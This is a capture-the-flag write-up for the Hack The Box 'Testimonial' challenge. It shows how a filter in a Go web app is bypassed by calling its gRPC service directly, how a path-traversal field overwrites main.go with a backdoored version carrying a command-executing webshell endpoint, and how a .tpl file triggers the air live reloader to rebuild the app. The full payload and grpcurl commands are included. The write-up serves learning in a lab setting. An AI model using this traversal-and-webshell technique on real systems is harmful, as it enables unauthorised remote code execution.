# Testimonial

## Enumeration
This was quite a tricky one but very interesting. At first we get a simple looking page:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

But then we look at the source code and see golang and a gRPC service. Took me longer than I care to admit to figure this one out but soon enough, from source code, we can tell that it seems to be filtering some characters.  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

From the Dockerfile, we see it is downloading and installing `air`:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

It even starts the application with `air`:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

I wasn't very familiar with this, but it seems like it's a live reloader for Go apps.  
ir  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

It's a bit like having a Flask application with Debug mode set to True but on steroids. It can be configured to detect any changes not only in the source code, but also within the directory structure of the application. For example, from the `.air.toml` config file, we can tell that it is including specific extensions, like tpl. So, if a file with a `.tpl` extension gets created within the application directory structure, then the app restarts, and rebuilds itself in the process.

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

This means that we should be able to get golang code execution if we can find a way to bypass the filter and rewrite the main.go file and then also drop a .tpl file to trigger air to restart and rebuild.

## Solution
This is where the gRPC comes in. Since the filter is only applied on the web interface, we can try to call the gRPC directly and bypass the filter entirely. We can do so using grpcurl and this syntax:  

```bash
./grpcurl -plaintext -proto challenge/pb/ptypes.proto -d @ 94.237.62.83:50292 RickyService/SubmitTestimonial < payload.json
```
In this syntax we are using the provided .proto file from the source code, we call the gRPC RickyService that we saw in the source code and submit a Testimonial. Just like the website is doing but without the filter getting in the way. The `payload.json` file contains this JSON.

```json
{
  "customer": "../../main.go",
  "testimonial": "package main\r\n\r\nimport (\r\n\t\"embed\"\r\n\t\"fmt\"\r\n\t\"log\"\r\n\t\"net\"\r\n\t\"net\/http\"\r\n\t\"os\/exec\"\r\n\r\n\t\"google.golang.org\/grpc\"\r\n\r\n\t\"htbchal\/handler\"\r\n\t\"htbchal\/pb\"\r\n\r\n\t\"github.com\/go-chi\/chi\/v5\"\r\n)\r\n\r\n\/\/go:embed public\r\nvar FS embed.FS\r\n\r\nfunc main() {\r\n\trouter := chi.NewMux()\r\n\r\n\trouter.HandleFunc(\"\/shell\", func(w http.ResponseWriter, r *http.Request) {\r\n\t\tcmd := r.URL.Query().Get(\"cmd\")\r\n\t\tif cmd == \"\" {\r\n\t\t\thttp.Error(w, \"No command provided\", http.StatusBadRequest)\r\n\t\t\treturn\r\n\t\t}\r\n\r\n\t\toutput, err := exec.Command(\"sh\", \"-c\", cmd).CombinedOutput()\r\n\t\tif err != nil {\r\n\t\t\thttp.Error(w, fmt.Sprintf(\"Error executing command: %s\", err), http.StatusInternalServerError)\r\n\t\t\treturn\r\n\t\t}\r\n\r\n\t\tw.Header().Set(\"Content-Type\", \"text\/plain\")\r\n\t\tw.WriteHeader(http.StatusOK)\r\n\t\tw.Write(output)\r\n\t})\r\n\r\n\trouter.Handle(\"\/*\", http.StripPrefix(\"\/\", http.FileServer(http.FS(FS))))\r\n\trouter.Get(\"\/\", handler.MakeHandler(handler.HandleHomeIndex))\r\n\tgo startGRPC()\r\n\tlog.Fatal(http.ListenAndServe(\":1337\", router))\r\n}\r\n\r\ntype server struct {\r\n\tpb.RickyServiceServer\r\n}\r\n\r\nfunc startGRPC() {\r\n\tlis, err := net.Listen(\"tcp\", \":50045\")\r\n\tif err != nil {\r\n\t\tlog.Fatal(err)\r\n\t}\r\n\ts := grpc.NewServer()\r\n\r\n\tpb.RegisterRickyServiceServer(s, &server{})\r\n\tif err := s.Serve(lis); err != nil {\r\n\t\tlog.Fatal(err)\r\n\t}\r\n}\r\n"
}
```
In the customer key we do some path traversal to overwite main.go. In the testimonial key we have our backdoored main.go which is the original main.go to which I added another endpoint to execute code... a webshell. You may notice that I have JSON escaped it to keep the valid JSON syntax. I generally use [this](https://www.freeformatter.com/json-escape.html#before-output) to make it easier to copy and paste.

When everything is setup correctly, we get the response we are looking for:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

At this point, the app has not restarted and rebuilt yet, we need to trigger it with a file containing one of the extensions from the .air.toml config. So we send another request via grpcurl.

```bash
./grpcurl -plaintext -proto challenge/pb/ptypes.proto -d @ 94.237.62.83:50292 RickyService/SubmitTestimonial < trigger.json 
```
The trigger.json content is the following:
```json
{
  "customer": "t.tpl",
  "testimonial": "This product is amazing!"
}
```
From our local docker experiment we can see the docker restarting and rebuilding because this .tpl file showed up.  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We apply this to the actual server and we get our flag:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`HTB{w34kly_t35t3d_t3mplate5}`
